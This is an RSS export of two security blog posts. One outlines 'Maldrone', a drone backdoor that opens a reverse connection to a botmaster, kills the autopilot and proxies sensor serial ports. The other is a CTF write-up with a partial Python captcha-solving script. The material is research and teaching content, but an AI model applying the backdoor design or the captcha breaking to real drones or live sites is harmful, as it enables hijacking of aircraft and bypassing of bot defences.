<?xml version="1.0" encoding="ISO-8859-1"?>

<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
	<channel>
		<title><![CDATA[Garage4hackers Forum - Blogs - Fb1h2s aka Rahul Sasi's Blog by fb1h2s]]></title>
		<link>http://garage4hackers.com/blog.php?u=8</link>
		<description>Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research.</description>
		<language>en</language>
		<lastBuildDate>Sun, 22 Mar 2020 10:24:39 GMT</lastBuildDate>
		<generator>vBulletin</generator>
		<ttl>60</ttl>
		<image>
			<url>http://garage4hackers.com/images/misc/rss.jpg</url>
			<title><![CDATA[Garage4hackers Forum - Blogs - Fb1h2s aka Rahul Sasi's Blog by fb1h2s]]></title>
			<link>http://garage4hackers.com/blog.php?u=8</link>
		</image>
		<item>
			<title>Maldrone the First Backdoor for drones.</title>
			<link>http://garage4hackers.com/entry.php?b=3105</link>
			<pubDate>Mon, 26 Jan 2015 15:56:37 GMT</pubDate>
			<description><![CDATA[Hi Guys, 
 
_*Introduction: 
*_ 
You read it right. I am going to give a quick demo for the first ever drone backdoor aka Maldrone [Malware Drone] . ...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Hi Guys,<br />
<br />
<u><b>Introduction:<br />
</b></u><br />
You read it right. I am going to give a quick demo for the first ever drone backdoor aka Maldrone [Malware Drone] . <br />
<br />
There are over 70 nations building remotely controllable drones. Most of these drones are capable of making autonomous decisions. Countries buy drones from there neighbors. What are the possibilities that there could be a backdoor in the drone you brought. What are the possible ways you can backdoor a drone. What would be the impact if a security issues is found in a computer devices that make decisions of there own. <br />
<br />
This is part of my ongoing research, some of it which I would be answering/demonstrating at Nullcon this feb 7th, 2015 <a href="http://nullcon.net/website/goa-15/about-speakers.php" target="_blank">http://nullcon.net/website/goa-15/about-speakers.php</a> . <br />
<br />
<u><b>Maldrone: Backdoor for Drones.<br />
</b></u><br />
Features: <br />
Maldrone will get silently installed on a drone.<br />
Interact with with the device drivers and sensors silently.<br />
Lets the bot master controller the drone remotely .<br />
Escape from the Drone owner to Bot master.<br />
Remote surveillance.<br />
Spread to other drones *. <br />
<br />
<b><u>Demo:<br />
</u></b><br />
In this we would show infecting a drone with Maldrone and expecting a reverse tcp connection from drone. Once connection is established we can interact with the software as well as drivers/sensors of drone directly. There is an existing AR drone pioloting program. Our backdoors kills the auto pilot and takes control. The Backdoor is persistent across resets . <br />
<br />

<iframe class="restrain" title="YouTube video player" width="640" height="390" src="//www.youtube.com/embed/5SlWdl4ZuAI?wmode=opaque" frameborder="0"></iframe>
<br />
<br />
<br />
For this research we are using Parrot Ar Drone 2.0 and DJI Phantom .Maldrone is developed for AR drone arm linux .<br />
<br />
In this demo we will install the drone with Maldrone. Once its installed. The Maldrone will connect back to botmaster and wait for commands. Maldrone can proxy the device driver and sensor communications. Maldrone could interact with the drone communication and proxy data from the drone sensors .<br />
<br />
<br />
<b><u>Maldrone would be a good buddy for <a href="http://samy.pl/skyjack/" target="_blank">http://samy.pl/skyjack/</a> .<br />
<br />
</u></b>Samy's skyjack is an exploit for parrot ardrone . Maldrone is a payload and not and exploit. So once  you hack a drone using skyjack or any drone specific vulnerability. You then install Maldrone as a backdoor. <br />
<br />
<br />
<b><u>The idea: AR drone Introduction<br />
</u></b><br />
Ar drone quad-copter contains a 9 degrees-of-freedom (DOF) .<br />
&quot;Degrees Of Freedom&quot; or &quot;DOF&quot; is a number of axis and sensors combined for balancing a plane, a helicopter or a robot.<br />
ref: <a href="http://playground.arduino.cc/Main/WhatIsDegreesOfFreedom6DOF9DOF10DOF11DOF" target="_blank">http://playground.arduino.cc/Main/Wh...9DOF10DOF11DOF</a><br />
<br />
in-ertial measurements unit (IMU)<br />
a) 6 DOF gyroscope and <br />
b) 3 DOF magnetometer.<br />
c) ul-trasound sensor[ used for low altitude measure-ments<br />
d) a pressure sensor [Altitude measurement at all altitudes. <br />
c) a GPS sensor.<br />
<br />
<u>The access to these sensor data are made available via serial ports. <br />
</u><br />
The Ar drone has a binary named program.elf which controls the entire drone using these nav-board data. This little program is smart enough to perform auto landing , flight stability and various other AR drone tricks.<br />
Check out this video: <a href="https://www.youtube.com/watch?v=IcxBf-kegKo" target="_blank">https://www.youtube.com/watch?v=IcxBf-kegKo</a><br />
<br />
<b><u>Is Maldrone the first malware for drones?<br />
</u></b><br />
Ar Drone also exposes a high level api , and this is open sourced. This would let you control the drone via AT commands. And could program the drone to do pretty much anything. Lot of previous researches and attempts to backdoor drones used this API . This would make the backdoor concept very generic to AR drone. <br />
<br />
<u>Ref previous works: <br />
</u><br />
<a href="http://boingboing.net/2012/12/09/flying-malware-the-virus-copt.html" target="_blank">http://boingboing.net/2012/12/09/fly...irus-copt.html</a><br />
<a href="http://www.cbronline.com/news/security/hackers-to-target-firms-via-drone-infection-4483778" target="_blank">http://www.cbronline.com/news/securi...ection-4483778</a><br />
<br />
<span style="font-family: arial"><font color="#0000ff">I am trying to build something more generic . The programs out there like the above  use parrot drone api as a backdoor. Parrot drone is a toy and our research is no way specific to parrot. We are documenting generic ways on how you could backdoor a drone.</font></span><br />
<br />
My idea of taking up this project was to learn how it is possible to backdoor robots and drones in general. So the best bet is to interact with the sensors and navigation data directly. <br />
<br />
<b><u>A good backdoor:<br />
</u></b><br />
A lot of people are trying to build a custom firmware for parrot ar drone. Technically a custom modified firmware or a replacement for the AR drone program.elf is enough as a substitute for a backdoor. But what we have now are highly unstable. The entire operation of AR drone is done via program.elf which is not opensource. Reversing and figuring out the serial port communication seems really hard, even though I and few other have taken that route. <br />
<br />
Ref: <br />
<a href="http://blog.perquin.com/blog/ar-drone-program-elf-replacement/" target="_blank">http://blog.perquin.com/blog/ar-dron...f-replacement/</a><br />
<a href="https://github.com/ardrone/ardrone" target="_blank">https://github.com/ardrone/ardrone</a><br />
<a href="https://github.com/felixge/go-ardrone" target="_blank">https://github.com/felixge/go-ardrone</a><br />
<a href="http://embedded-software.blogspot.in/2010/12/plf-file-format.html" target="_blank">http://embedded-software.blogspot.in...le-format.html</a><br />
<br />
<u><b>Building the Backdoor:<br />
</b></u><br />
The drone controller program.elf interacts with the navigation board using the following serial ports.<br />
<br />
/dev/ttyO0 —&gt; rotors and leds<br />
/dev/ttyO1 —&gt; Nav board <br />
/dev/ttyPA1 — &gt; Motor driver<br />
/dev/ttyPA2 —&gt; accelerometer, gyrometer, and sonar sensors<br />
/dev/video0 --&gt;<br />
/dev/video1 — &gt; video4linux2 devices<br />
/dev/i2c-0 <br />
/dev/i2c-1 <br />
/dev/i2c-2 <br />
/dev/usb-i2c <br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=836&amp;d=1422306904" border="0" alt="Name:  ida_re.jpg
Views: 16503
Size:  37.0 KB"  /><br />
<br />
program.elf like any other serial port programing uses linux syscall open to read devices . Since program.elf is using those ports, our backdoor would not be able to interact with those sensors. Since we do not have an ideal solution for replacing program.elf and accessing sensors.<br />
<br />
<u><b>Maldrone Idea.<br />
</b></u><br />
Step 1: Kills program.elf <br />
Step 2: Setup a proxy serial port for navboard and others.<br />
Step 3: Redirect actual serial port communication to fake ports<br />
Step 4: patch program.elf and make it open our proxy serial ports.<br />
Step 5: Maldrone communicates to serial ports directly<br />
<br />
Now all serial communication to navboard goes via Maldrone. He can intercept and modify data on the fly. It will connect to botserver and make it available for botmaster.<br />
<br />
More technical details of the hack would be presented at Nullcon .<br />
<a href="http://nullcon.net/website/goa-15/about-speakers.php" target="_blank">http://nullcon.net/website/goa-15/about-speakers.php</a> <br />
<br />
<font color="#FF0000"><b><u>Disclaimer <br />
</u></b></font><font color="#FF0000">What ever we are demonstrating is for educational purpose only.</font><font color="#ff0000">Working at Citrix has given me the flexibility to conduct research in an area i’m very passionate about. This “maldrone” research was conducted solely by me, Rahul Sasi, and does not reflect the products or vision of Citrix. </font><br />
<br />
I am a very curious person . The objective of this research was to learn about Artificial Intelligence programming and get answers to few questions I had. <br />
<br />
Attend my talk at Nullcon if you are interested. These are the following stuffs you would take away from my talk.<br />
<br />
1) Drone aviations principles.<br />
2) ARM Reversing<br />
3) Linux Driver Communication and proxying. <br />
4) DOS attacks on drones<br />
5) Security vulnerabilities in drone<br />
<br />
<br />
Regards,<br />
<br />
Rahul Sasi<br />
<a href="http://twitter.com/fb1h2s" target="_blank">http://twitter.com/fb1h2s</a></blockquote>

]]></content:encoded>
			<dc:creator>fb1h2s</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3105</guid>
		</item>
		<item>
			<title>Cracking a Captcha . Nullcon| EMC2 CTF 2015</title>
			<link>http://garage4hackers.com/entry.php?b=3103</link>
			<pubDate>Thu, 15 Jan 2015 11:31:25 GMT</pubDate>
			<description><![CDATA[Last week EMC2/nullcon CTF got over . Even though I really wanted to I did not have enough time to play the ctf. I was/am busy working on my "hacking...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Last week EMC2/nullcon CTF got over . Even though I really wanted to I did not have enough time to play the ctf. I was/am busy working on my &quot;hacking Drones&quot; research for Nullcon . <br />
<a href="http://nullcon.net/website/goa-15/speakers/rahul-sasi.php" target="_blank">http://nullcon.net/website/goa-15/sp...rahul-sasi.php</a><br />
<br />
<br />
Last year I was one among the top 30 finilist of EMC2 defenders league and stood 5th in the final ranking. <br />
<a href="https://www.facebook.com/photo.php?fbid=10152251137152454&amp;set=a.10150335731172454.367842.584252453&amp;type=1&amp;theater" target="_blank">https://www.facebook.com/photo.php?f...type=1&amp;theater</a><br />
<a href="https://twitter.com/varunsharma14/status/408165888308039680" target="_blank">https://twitter.com/varunsharma14/st...65888308039680</a><br />
<br />
<br />
Any way on Sunday night I got bit bored with drones and decided to take a sneak peak at the CTF, but by that time the winners were declared and score board was closed. I went straight to my favorite web and reversing challenges and decide to solve one of those. Web 5 was a captcha sovler for 500 point ands I decided that would be easy.<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=830&amp;d=1421318897" border="0" alt="Name:  10926458_10153215485122454_4416938377600721468_n.jpg
Views: 4216
Size:  16.6 KB"  style="float: CONFIG" /><br />
<br />
The challenge was to break maximum number of captcha and submit using a given session token in a time frame of 2 minutes.  <br />
<br />
Analyzing the captcha we easily understand that , there are 5 easily visible colours.<br />
Black == background <br />
dark violet == dots<br />
Gray   == lines<br />
Letters == In some form of light violet colors. <br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=827&amp;d=1421317797" border="0" alt="Name:  imagedemo.png
Views: 3978
Size:  1.9 KB"  style="float: CONFIG" /><br />
<br />
<br />
Form the look of it, it was an easily crack-able captcha . <br />
<br />
This is small AI problem where we need to create a program that could recognize these captchas. We need to teach our AI program what is right and what is<br />
wrong. So the first step is to build a training data set, that goes as an input for our captcha solver . For creating the training data people choose<br />
different methods, they depend on neural networks, Vector Space Search etc. In our current situation we do not have a complicated data set. The captcha is simple and has only [a-z,A-Z ] characters in it.<br />
<br />
<br />
<u><b>Building the Training Data set.	<br />
</b></u><br />
<br />
<u><b>Step 1 :<br />
</b></u>  <br />
  The captcha image we are provided was a PNG file, which is in RGBA mode [Red Green Blue Alpha] . ref: en.wikipedia.org/wiki/RGBA_color_space. We will have to bring it down to a maxium of 255 colour space. And the best way to do that is to<br />
  convert the image to gif form png. We will use python PHL module to do that.<br />
  <br />
  &quot;<br />
  captcha_image = captcha_image.convert(&quot;P&quot;)<br />
  <br />
  &quot;<br />
  <br />
  Next step is the find the image pixel concentration . Plot the colour and the respective pixel count.<br />
  <br />
  We can use phil histogram and plot . And we get the following. <br />
  <br />
<u>  [-] Image pixel concentration <br />
</u><br />
    0 8344<br />
    190 938<br />
    53 301<br />
    96 184<br />
    204 113<br />
    205 69<br />
    60 24<br />
    210 14<br />
    211 7<br />
    95 4<br />
    <br />
    Here 0 stands for Black and has the most pixel count 8344 followed by color 190. At this point I assumed color 204 and 205 are those that that are used for captcha letters.      <br />
    <br />
<u><b>Step 2:<br />
</b></u><br />
Remove the noises from the image. This is easy to do as we can simply remove those pixels that are not used for captcha letters.<br />
<br />
Simply plot those captcha letter colors to a new image and remove everything else.<br />
<br />
  if pix == 204 or pix == 205: # these are the numbers to get<br />
	captcha_filtered.putpixel((y,x),0)<br />
	<br />
Now we would get an image whose background is white with all noises removed.<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=832&amp;d=1421320790" border="0" alt="Name:  10926789_10153215507002454_389180500482001232_o.jpg
Views: 4021
Size:  18.2 KB"  style="float: CONFIG" /><br />
<br />
<u><b>Step 3:<br />
</b></u><br />
Next step is to find the captcha letter spacing, and slice each characters out of the captcha . <br />
<br />
This would be easy as we have only three different colours in our new image. 255,204,205 .<br />
<br />
<br />
Horizontal position where letter start and stop .<br />
<br />
|a|s|d|f|e<br />
<br />
image 1 Line Spacing is [(5, 13), (35, 43), (65, 73), (95, 102), (125, 133), (155, 163)]<br />
Image 2 Line Spacing is [(5, 13), (35, 43), (66, 73), (96, 102), (125, 133), (155, 163)]<br />
<br />
Each letters in the captcha occupied almost the same space .<br />
Cut each characters and place them inside a folder.<br />
Rename each letter images[file name] to there respective letter .<br />
Now we will have a folder with sliced letter named with there respective letter. <br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=831&amp;d=1421320747" border="0" alt="Name:  10904415_10153215506997454_4402739535327763108_o.jpg
Views: 4063
Size:  19.3 KB"  style="float: CONFIG" /><br />
<br />
<br />
<u><b>Final Solution algorithm:<br />
</b></u><br />
The final algorithm to solve the captcha would be.<br />
<br />
  a) read a new captcha , session cookie<br />
  b) filter noise out<br />
  c) Slice filtered captcha and extract each letter<br />
  d) compare it with those letters kept in the letter folder and find the best match,<br />
  c) best match would be the captcha letter<br />
  d) continue for all letters in captcha<br />
  e) Submit the full captcha along with  session cookie to application<br />
  f) fetch new captcha with session cookie, goto step b<br />
<br />
Compare two images in Python:<br />
<br />
There are multiple ways to compare an image in python .<br />
<br />
1) Calculate the root mean square<br />
ref: <a href="http://code.activestate.com/recipes/577630-comparing-two-images/" target="_blank">http://code.activestate.com/recipes/...ng-two-images/</a><br />
<br />
2) Euclidean distance<br />
3) Normalized cross-correlation<br />
<br />
We will choose the normalized cross relation. <br />
<br />
PHIL module's difference returns the absolute value of the difference between the two images.<br />
 <br />
ImageChops.difference(image1, image2) &#8658; image<br />
<br />
    out = abs(image1 - image2)<br />
<br />
Our images are in the same shape and size. So this is the best bet. <br />
<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">from&nbsp;PIL&nbsp;import&nbsp;Image</span><span style="color: #007700">,</span><span style="color: #0000BB">ImageChops<br />from&nbsp;operator&nbsp;import&nbsp;itemgetter<br />import&nbsp;urllib2</span><span style="color: #007700">,</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">urllib<br />import&nbsp;cStringIO</span><span style="color: #007700">,</span><span style="color: #0000BB">glob<br /></span><span style="color: #FF8000">#we&nbsp;have&nbsp;kept&nbsp;all&nbsp;our&nbsp;letters&nbsp;in&nbsp;this&nbsp;folder&nbsp;<br /></span><span style="color: #0000BB">files_names&nbsp;</span><span style="color: #007700">=&nbsp;&nbsp;</span><span style="color: #0000BB">glob</span><span style="color: #007700">.</span><span style="color: #0000BB">glob</span><span style="color: #007700">(</span><span style="color: #DD0000">"/root/ctf/let/*.*"</span><span style="color: #007700">)<br /></span><span style="color: #FF8000">#we&nbsp;need&nbsp;to&nbsp;get&nbsp;the&nbsp;captcha&nbsp;at&nbsp;the&nbsp;same&nbsp;time&nbsp;get&nbsp;the&nbsp;session&nbsp;cookie,&nbsp;and&nbsp;use&nbsp;it&nbsp;for&nbsp;all&nbsp;solved&nbsp;captcha&nbsp;request.<br /></span><span style="color: #0000BB">response&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urllib2</span><span style="color: #007700">.</span><span style="color: #0000BB">urlopen</span><span style="color: #007700">(</span><span style="color: #DD0000">'http://54.165.191.231/imagedemo.php'</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">cookie&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">response</span><span style="color: #007700">.</span><span style="color: #0000BB">headers</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'Set-Cookie'</span><span style="color: #007700">&#93;<br /></span><span style="color: #FF8000">#print&nbsp;cookie<br /><br />#lets&nbsp;make&nbsp;500&nbsp;request&nbsp;read&nbsp;teach&nbsp;captcha&nbsp;<br /></span><span style="color: #007700">for&nbsp;</span><span style="color: #0000BB">x&nbsp;in&nbsp;range</span><span style="color: #007700">(</span><span style="color: #0000BB">1</span><span style="color: #007700">,</span><span style="color: #0000BB">500</span><span style="color: #007700">):<br />&nbsp;&nbsp;<br />&nbsp;&nbsp;</span><span style="color: #0000BB">captcha&nbsp;</span><span style="color: #007700">=</span><span style="color: #DD0000">""<br />&nbsp;&nbsp;</span><span style="color: #0000BB">opener&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urllib2</span><span style="color: #007700">.</span><span style="color: #0000BB">build_opener</span><span style="color: #007700">()<br />&nbsp;&nbsp;</span><span style="color: #0000BB">opener</span><span style="color: #007700">.</span><span style="color: #0000BB">addheaders&nbsp;</span><span style="color: #007700">=&#91;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(</span><span style="color: #DD0000">'Accept'</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'application/json,&nbsp;text/javascript,&nbsp;*/*;&nbsp;q=0.01'</span><span style="color: #007700">),<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(</span><span style="color: #DD0000">'Referer'</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'http://www.garag4hackers.com'</span><span style="color: #007700">),<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(</span><span style="color: #DD0000">'Cookie'&nbsp;</span><span style="color: #007700">,</span><span style="color: #0000BB">cookie</span><span style="color: #007700">),&#93;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;</span><span style="color: #0000BB">response&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">opener</span><span style="color: #007700">.</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">'http://54.165.191.231/imagedemo.php'</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">length&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">response</span><span style="color: #007700">.</span><span style="color: #0000BB">headers</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'content-length'</span><span style="color: #007700">&#93;<br />&nbsp;&nbsp;</span><span style="color: #FF8000">#&nbsp;read&nbsp;the&nbsp;captch&nbsp;and&nbsp;we&nbsp;will&nbsp;save&nbsp;them&nbsp;with&nbsp;there&nbsp;content&nbsp;length&nbsp;*/<br />&nbsp;&nbsp;</span><span style="color: #007700">print&nbsp;</span><span style="color: #DD0000">"&#91;-&#93;&nbsp;Image&nbsp;Content&nbsp;length&nbsp;"&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">length<br />&nbsp;&nbsp;image_read&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">response</span><span style="color: #007700">.</span><span style="color: #0000BB">read</span><span style="color: #007700">()<br />&nbsp;&nbsp;</span><span style="color: #FF8000">#cStringIO&nbsp;to&nbsp;create&nbsp;an&nbsp;object&nbsp;from&nbsp;memmory<br />&nbsp;&nbsp;#image_read&nbsp;=&nbsp;Image.open("/root/ctf/u.png")<br />&nbsp;&nbsp;</span><span style="color: #0000BB">image_read&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">cStringIO</span><span style="color: #007700">.</span><span style="color: #0000BB">StringIO</span><span style="color: #007700">(</span><span style="color: #0000BB">image_read</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">captcha_image&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">Image</span><span style="color: #007700">.</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #0000BB">image_read</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #FF8000">#im&nbsp;=&nbsp;Image.open("/root/ctf/de")<br />&nbsp;&nbsp;</span><span style="color: #0000BB">captcha_image&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">captcha_image</span><span style="color: #007700">.</span><span style="color: #0000BB">convert</span><span style="color: #007700">(</span><span style="color: #DD0000">"P"</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">temp&nbsp;</span><span style="color: #007700">=&nbsp;{}<br />&nbsp;&nbsp;</span><span style="color: #0000BB">captcha_filtered&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">Image</span><span style="color: #007700">.new(</span><span style="color: #DD0000">"P"</span><span style="color: #007700">,</span><span style="color: #0000BB">captcha_image</span><span style="color: #007700">.</span><span style="color: #0000BB">size</span><span style="color: #007700">,</span><span style="color: #0000BB">255</span><span style="color: #007700">)<br /><br />&nbsp;&nbsp;</span><span style="color: #FF8000">#print&nbsp;im.histogram()<br />&nbsp;&nbsp;</span><span style="color: #0000BB">his&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">captcha_image</span><span style="color: #007700">.</span><span style="color: #0000BB">histogram</span><span style="color: #007700">()<br />&nbsp;&nbsp;</span><span style="color: #0000BB">values&nbsp;</span><span style="color: #007700">=&nbsp;{}<br /><br />&nbsp;&nbsp;for&nbsp;</span><span style="color: #0000BB">i&nbsp;in&nbsp;range</span><span style="color: #007700">(</span><span style="color: #0000BB">256</span><span style="color: #007700">):<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">values</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">i</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">his</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">i</span><span style="color: #007700">&#93;<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">"&#91;-&#93;&nbsp;Image&nbsp;pixel&nbsp;concentration&nbsp;\n"&nbsp;&nbsp;<br />&nbsp;&nbsp;</span><span style="color: #007700">for&nbsp;</span><span style="color: #0000BB">color</span><span style="color: #007700">,</span><span style="color: #0000BB">concentrate&nbsp;in&nbsp;sorted</span><span style="color: #007700">(</span><span style="color: #0000BB">values</span><span style="color: #007700">.</span><span style="color: #0000BB">items</span><span style="color: #007700">(),&nbsp;</span><span style="color: #0000BB">key</span><span style="color: #007700">=</span><span style="color: #0000BB">itemgetter</span><span style="color: #007700">(</span><span style="color: #0000BB">1</span><span style="color: #007700">),&nbsp;</span><span style="color: #0000BB">reverse</span><span style="color: #007700">=</span><span style="color: #0000BB">True</span><span style="color: #007700">)&#91;:</span><span style="color: #0000BB">10</span><span style="color: #007700">&#93;:<br />&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #0000BB">color</span><span style="color: #007700">,</span><span style="color: #0000BB">concentrate<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;</span><span style="color: #007700">for&nbsp;</span><span style="color: #0000BB">x&nbsp;in&nbsp;range</span><span style="color: #007700">(</span><span style="color: #0000BB">captcha_image</span><span style="color: #007700">.</span><span style="color: #0000BB">size</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">1</span><span style="color: #007700">&#93;):<br />&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;</span><span style="color: #0000BB">y&nbsp;in&nbsp;range</span><span style="color: #007700">(</span><span style="color: #0000BB">captcha_image</span><span style="color: #007700">.</span><span style="color: #0000BB">size</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">0</span><span style="color: #007700">&#93;):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">pix&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">captcha_image</span><span style="color: #007700">.</span><span style="color: #0000BB">getpixel</span><span style="color: #007700">((</span><span style="color: #0000BB">y</span><span style="color: #007700">,</span><span style="color: #0000BB">x</span><span style="color: #007700">))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">temp</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">pix</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">pix<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">pix&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">204&nbsp;</span><span style="color: #007700">or&nbsp;</span><span style="color: #0000BB">pix&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">205</span><span style="color: #007700">:&nbsp;</span><span style="color: #FF8000">#&nbsp;these&nbsp;are&nbsp;the&nbsp;numbers&nbsp;to&nbsp;get<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">captcha_filtered</span><span style="color: #007700">.</span><span style="color: #0000BB">putpixel</span><span style="color: #007700">((</span><span style="color: #0000BB">y</span><span style="color: #007700">,</span><span style="color: #0000BB">x</span><span style="color: #007700">),</span><span style="color: #0000BB">0</span><span style="color: #007700">)<br /><br />&nbsp;&nbsp;</span><span style="color: #0000BB">captcha_filtered</span><span style="color: #007700">.</span><span style="color: #0000BB">save</span><span style="color: #007700">(</span><span style="color: #DD0000">"/root/ctf/images/"</span><span style="color: #007700">+</span><span style="color: #0000BB">length</span><span style="color: #007700">+</span><span style="color: #DD0000">".gif"</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">inletter&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">False<br />&nbsp;&nbsp;foundletter</span><span style="color: #007700">=</span><span style="color: #0000BB">False<br />&nbsp;&nbsp;start&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;end&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br /><br />&nbsp;&nbsp;letters&nbsp;</span><span style="color: #007700">=&nbsp;&#91;&#93;<br /><br />&nbsp;&nbsp;for&nbsp;</span><span style="color: #0000BB">y&nbsp;in&nbsp;range</span><span style="color: #007700">(</span><span style="color: #0000BB">captcha_filtered</span><span style="color: #007700">.</span><span style="color: #0000BB">size</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">0</span><span style="color: #007700">&#93;):&nbsp;</span><span style="color: #FF8000">#&nbsp;slice&nbsp;across<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">for&nbsp;</span><span style="color: #0000BB">x&nbsp;in&nbsp;range</span><span style="color: #007700">(</span><span style="color: #0000BB">captcha_filtered</span><span style="color: #007700">.</span><span style="color: #0000BB">size</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">1</span><span style="color: #007700">&#93;):&nbsp;</span><span style="color: #FF8000">#&nbsp;slice&nbsp;down<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">pix&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">captcha_filtered</span><span style="color: #007700">.</span><span style="color: #0000BB">getpixel</span><span style="color: #007700">((</span><span style="color: #0000BB">y</span><span style="color: #007700">,</span><span style="color: #0000BB">x</span><span style="color: #007700">))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #0000BB">pix&nbsp;</span><span style="color: #007700">!=&nbsp;</span><span style="color: #0000BB">255</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">inletter&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">True<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">foundletter&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">False&nbsp;</span><span style="color: #007700">and&nbsp;</span><span style="color: #0000BB">inletter&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">True</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">foundletter&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">True<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;start&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: 